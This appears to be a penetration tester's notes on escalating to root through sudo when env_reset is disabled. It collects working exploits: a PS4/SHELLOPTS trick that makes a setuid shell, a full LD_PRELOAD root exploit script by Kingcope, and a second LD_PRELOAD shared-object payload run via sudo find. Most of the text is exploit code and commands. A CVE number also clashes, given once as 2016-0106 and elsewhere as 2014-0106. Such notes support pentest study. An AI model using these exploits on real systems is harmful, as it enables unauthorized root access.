Consider the following Sudo configuration for our user account “monitor”:

$ sudo -l
[sudo] password for monitor:
Matching Defaults entries for monitor on this host:
    !env_reset
User monitor may run the following commands on this host:
    (root) /etc/init.d/sshd

The env_reset option is disabled! This means we can manipulate the environment of the command we are allowed to run. Depending on the Sudo version, we may be able to escalate our privileges by passing environment variables, as illustrated by the following well-known exploits:

    PS4 (breno)  http://packetstormsecurity.com/files/41442/sudo168p10.sh.txt.html
    LD_PRELOAD (Kingcope or Sensepost) http://packetstormsecurity.com/files/71988/sudo-local.txt.html http://www.sensepost.com/blog/9108.html

Also keep in mind that there may be other dangerous environment variables that we could misuse (think of PERL5OPT, PYTHONINSPECT etc.).



It should be noted though, that even when env_reset is disabled, most dangerous environment variables are now safely removed by Sudo, based on a default hard-coded blacklist. Run “sudo -V” as root to see this blacklist under “Environment variables to remove”.

*** refer to : /tmp/env_remove.txt for the list

However, in Sudo < 1.8.5, we found that environment variables passed in on the command line are not removed even though they should be. Thus we can still escalate our privileges using for example the LD_PRELOAD technique, as demonstrated below on a fully up-to-date Red Hat Enterprise Linux 5.10 system (only missing the recent security update of course):

CVE-2016-0106
======================

If the env_reset option is disabled in the sudoers file, a malicious user with sudo permissions may be able to run arbitrary
commands with elevated privileges by manipulating the environment of a command the user is legitimately allowed to run

Sudo 1.6.9 through 1.8.4p5 inclusive.  Sudo 1.8.5 and higher are not affected.

refer to :
/exploits/CVE-2014-0106.txt

https://seclists.org/oss-sec/2014/q1/510


Exploiting PS4
======================

exploit for adv :  http://www.securityfocus.com/bid/15191/info


## Sudo local root escalation privilege ##
## vuln versions :  sudo < 1.6.8p10
## by breno

## You need sudo access execution for some bash script ##
## Use csh shell to change SHELLOPTS env ##

ie:
  %cat x.sh
  % cat x.sh
  #!/bin/bash -x

  echo "Getting root!!"
  %             
##

## 
  # cat /etc/shadow
  ...
  breno   ALL=(ALL) /home/breno/x.sh
  ..
  #

## Let's use an egg shell :)
  %cat egg.c

#include <stdio.h>

  int main()
  {
        setuid(0);
        system("/bin/sh");
        }
        %
               
% gcc -o egg egg.c
% setenv SHELLOPTS xtrace
% setenv PS4 '$(chown root:root egg)'
% sudo ./x.sh
echo Getting root!!
Getting root!!
% ls -lisa egg
1198941 8 -rwxr-xr-x  1 root root 7428 2005-11-09 13:54 egg
% setenv PS4 '$(chmod +s egg)'
% sudo ./x.sh
echo Getting root!!
Getting root!!
% ./egg
sh-3.00# id
uid=0(root) gid=1000(breno) egid=0(root) grupos=7(lp),102(lpadmin),1000(breno)
sh-3.00#      


Exploiting LD_PRELOAD - Example 1
======================================

#!/bin/sh
#* Sudo <= 1.6.9p18 local r00t exploit
#* by Kingcope/2008/www.com-winner.com
#
# Most lame exploit EVER!
#
# Needs a special configuration in the sudoers file:
# --->>>>> "Defaults setenv" so environ vars are preserved :) <<<<<---
#
# May also need the current users password to be typed in
# So this exploit is UBERLAME!
# First Argument to this shell file: A program your current
# user is allowed to execute via sudo. sudo has to be in 
# the path!!
# successfully tested on FreeBSD-7.0 and RedHat Linux
# I don't even know why I realease such stuffz
# I'M GONNA GRAB A COFFE NOW;HAVE PHUN !!!

echo "Sudo <= 1.6.9p18 local r00t exploit"
echo "by Kingcope/2008/www.com-winner.com"

if [$1 == ""]; then
echo "Please give me a program to run via sudo."
echo "Allowed programs:"
sudo -l
exit
fi

cat > program.c << _EOF
#include <unistd.h>
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init()
{
 if (!geteuid()) {
 unsetenv("LD_PRELOAD");
 setgid(0);
 setuid(0);
 execl("/bin/sh","sh","-c","chown 0:0 /tmp/xxxx; /bin/chmod +xs /tmp/xxxx",NULL);
 }
}

_EOF

cat > xxxx.c << _EOF
int main(void) {
       setgid(0); setuid(0);
//       unlink("/tmp/xxxx");
       execl("/bin/sh","sh",0); }
_EOF

gcc -o /tmp/xxxx xxxx.c
gcc -o program.o -c program.c -fPIC
gcc -shared -Wl,-soname,libno_ex.so.1 -o /tmp/libno_ex.so.1.0 program.o -nostartfiles
sudo LD_PRELOAD=/tmp/libno_ex.so.1.0 $1
if [ -f /tmp/xxxx ]; then
echo "CONGRATULATIONS, IT'S A ROOTSHELL!"
/tmp/xxxx
else
echo "Sorry, exploit failed. No envvars allowed?"
fi


Exploiting LD_PRELOAD - Example 2
======================================

http://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/

in etc/sudoers (lab test) :

Defaults env_reset
Defaults env_keep += LD_PRELOAD


$ sudo -l
user  ALL=(ALL:ALL) NOPASSWD: /usr/bin/find

generate a C-program file inside /tmp directory.

shell.c
=================
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}

Compile it to generate a shared object with .so extension likewise .dll file in Windows operating system and hence type following:

gcc -fPIC -shared -o shell.so shell.c -nostartfiles
ls -al shell.so
sudo LD_PRELOAD=/tmp/shell.so find
id
whoami